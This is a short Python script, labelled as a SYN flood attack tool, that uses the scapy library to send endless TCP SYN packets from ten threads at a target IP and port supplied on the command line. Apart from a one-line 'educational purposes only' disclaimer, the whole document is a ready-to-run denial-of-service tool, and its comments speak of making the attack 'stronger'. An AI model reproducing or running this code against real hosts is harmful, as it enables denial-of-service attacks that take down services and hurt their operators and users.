# This script is for educational purposes only. Use it responsibly and legally.
# SYN Flood Attack Script - by Petre Radu

from scapy.all import IP, TCP, RandInt, RandShort, send
import sys
import threading

# Get target IP and port from user
if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <Target IP> <Port>")
    sys.exit(1)

target_ip = sys.argv[1]
target_port = int(sys.argv[2])

# Function to send SYN packets
def syn_flood():
    while True:
        # Create IP and TCP layer for SYN packet
        ip = IP(dst=target_ip)
        tcp = TCP(dport=target_port, flags='S', seq=RandInt(), sport=RandShort())

        # Send the packet
        send(ip/tcp, verbose=False)

print(f"[INFO] Starting SYN flood on {target_ip}:{target_port}...")

# Run multiple threads for stronger attack
threads = []
for _ in range(10):  # Adjust thread count for stronger impact
    t = threading.Thread(target=syn_flood)
    t.daemon = True
    threads.append(t)
    t.start()

# Keep the script running
try:
    while True:
        pass
except KeyboardInterrupt:
    print("\n[INFO] Attack stopped.")